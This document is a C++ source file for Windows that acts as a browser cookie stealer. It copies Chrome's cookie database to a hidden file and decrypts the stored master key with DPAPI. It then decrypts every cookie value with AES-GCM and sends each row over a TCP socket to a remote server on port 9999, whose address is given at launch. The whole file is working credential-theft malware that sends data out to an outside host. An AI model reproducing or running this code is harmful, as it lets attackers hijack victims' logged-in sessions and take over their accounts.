#ifndef _WINSOCK_DEPRECATED_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#endif
#define _WINSOCKAPI_    // stops windows.h including winsock.h
#define SPLIT "-----------------------------------------------------------\n"
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Bcrypt.lib")

#ifdef WIN32
#pragma comment(lib, "sqlite3.lib")
#else
#pragma comment(lib, "sqlite3_x64.lib")
#endif

#include <WinSock2.h>
#include <Windows.h>
#include <windows.data.json.h>
#include <fstream>
#include <sstream>
#include "json.h"
#include <iostream>
#include "base64.h"
#include <bcrypt.h>

#include "sqlite3.h"


DATA_BLOB original_key;

PUCHAR decrypt(PUCHAR enc, int size) {
	if (size <= 15) return (PUCHAR)enc;
	
	BCRYPT_ALG_HANDLE bCryptAlg;
	BCRYPT_KEY_HANDLE bCryptKey;
	struct{
		BCRYPT_KEY_DATA_BLOB_HEADER Header;
		UCHAR Key[32];
	} parse_key;
	int errCode;
	parse_key.Header.dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
	parse_key.Header.dwVersion = 1;
	parse_key.Header.cbKeyData = 32;
	memcpy(parse_key.Key, original_key.pbData, 32);

	PUCHAR pbKeyObject;
	ULONG cbKeyObject = 0;
	ULONG cbData;

	UCHAR iv[12];
	memcpy(iv, enc + 3, 12);
	enc = enc + 15;
	PUCHAR output = new UCHAR[2000];
	memset(output, 0, 2000);
	ULONG result;

	if ((errCode = BCryptOpenAlgorithmProvider(&bCryptAlg, BCRYPT_AES_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0)) != 0) {
		printf("BcryptOpenAlgorithmProvider error: Status code %x\n", errCode);
		return NULL;
	}

	if ((errCode = BCryptGetProperty(bCryptAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0 )) != 0) {
		printf("BCryptGetProperty error: Status code %x\n", errCode);
		return NULL;
	}

	if ((errCode = BCryptSetProperty(bCryptAlg,	BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM,	sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) != 0) {
		printf("BCryptSetProperty error: Status code %x\n", errCode	);
		return NULL;
	}

	pbKeyObject = new UCHAR[cbKeyObject];
	memset(pbKeyObject, 0, cbKeyObject);

	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authModeInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(authModeInfo);
	authModeInfo.pbNonce = iv;
	authModeInfo.cbNonce = 12;
	authModeInfo.pbAuthData = NULL;
	authModeInfo.cbAuthData = 0;
	authModeInfo.pbTag = (PUCHAR)_strdup((char*)(enc + (size - 16 - 15)));
	authModeInfo.cbTag = 16;
	authModeInfo.cbMacContext = 16;
	authModeInfo.pbMacContext = new BYTE[16];
	memset(authModeInfo.pbMacContext, 0, 16);

	if ((errCode = BCryptImportKey(bCryptAlg, NULL, BCRYPT_KEY_DATA_BLOB, &bCryptKey, pbKeyObject, cbKeyObject, (PUCHAR)&parse_key, sizeof(parse_key), 0)) != 0) {
		printf("BcryptImportKey error: Status code %x\n", errCode);
		return NULL;
	}
	if ((errCode = BCryptDecrypt(bCryptKey, (PUCHAR)enc, size - 15 - 16, &authModeInfo, iv, 12, output, 2000, &result, 0)) != 0) {
		printf("BCryptDecrypt error: Status code %x\n", errCode);
		//printf("%s", enc);
		return enc;
	}
	
	BCryptCloseAlgorithmProvider(bCryptAlg, 0);
	return output;
}


int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("Input server IP");
		return 1;
	}
	

// Create Socket
	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData;
	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("WSAStartup error\n");
	}

	SOCKET s = 0;
	struct sockaddr_in server;
	do {
		if (s != 0) {
			closesocket(s);
			s = 0;
		}
		if ((s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 1)) == INVALID_SOCKET) {
			printf("WSASocketA error\n");
			return 1;
		}
		server.sin_family = AF_INET;
		server.sin_port = htons(9999);
		server.sin_addr.s_addr = inet_addr(argv[1]);
	}
	while (connect(s, (sockaddr*)&server, sizeof(struct sockaddr_in)));
	
// Decrypt Chrome Cookie file
	std::string chromeCookiePath;
	chromeCookiePath.resize(1000);
	chromeCookiePath = std::getenv("LOCALAPPDATA");
	chromeCookiePath += "\\Google\\Chrome\\User Data\\Default\\Cookies";
	std::string tmp = std::getenv("LOCALAPPDATA");
	tmp += "\\.ctmp";
	CopyFileA(chromeCookiePath.c_str(), tmp.c_str(), FALSE);
	SetFileAttributesA(LPCSTR(tmp.c_str()), FILE_ATTRIBUTE_HIDDEN);

	//get encrypted key
	std::string localStatePath;
	localStatePath.resize(1000);
	localStatePath = std::getenv("LOCALAPPDATA");
	localStatePath+= "\\Google\\Chrome\\User Data\\Local State";
	
	std::ifstream localState(localStatePath);
	std::stringstream data;
	data << localState.rdbuf();
	json::jobject jdata = json::jobject::parse(data.str());
	jdata = json::jobject::parse(jdata["os_crypt"].as_string());
	std::string encrypted_key = jdata["encrypted_key"].as_string();

	std::string decrypted_key = base64_decode(encrypted_key);
	decrypted_key.erase(0, 5);

	DATA_BLOB decrypted_key_blob;
	decrypted_key_blob.pbData = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, decrypted_key.size());
	CopyMemory((LPVOID)decrypted_key_blob.pbData, (LPVOID)decrypted_key.c_str(), decrypted_key.size());
	decrypted_key_blob.cbData = decrypted_key.size();
	original_key.pbData = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, int(decrypted_key.size() * 3 / 4));
	CryptUnprotectData(&decrypted_key_blob, NULL, NULL, NULL, NULL, CRYPTPROTECT_VERIFY_PROTECTION, &original_key);
	
	sqlite3* db;
	sqlite3_open(tmp.c_str(), &db);
	if (db == NULL) {
		printf("%s", sqlite3_errmsg(db));
		return 1;
	}
	sqlite3_stmt* stmt;
	sqlite3_prepare(db, "select * from cookies", 50, &stmt, 0);
	while (1) {
		int rescode = sqlite3_step(stmt);
		if (rescode != SQLITE_ROW) break;
		for (int i = 0; i < sqlite3_column_count(stmt); i++) {
			char line[1000];
			memset(line, 0, 1000);
			char* name = (char *)sqlite3_column_name(stmt, i);
			if (strcmp(name, "encrypted_value")) snprintf(line, 1000, "%s: %s; ", name, sqlite3_column_text(stmt, i));
			else {
				void* data = (void*)sqlite3_column_blob(stmt, i);
				int size = sqlite3_column_bytes(stmt, i);
				snprintf(line, 1000, "%s: %s; ", name, decrypt((PUCHAR)data, size));
			}
			printf("%s\n", line);
			int code = send(s, line, strlen(line), 0);
		}
		send(s, SPLIT, strlen(SPLIT), 0);
		puts("");
		
	}	
}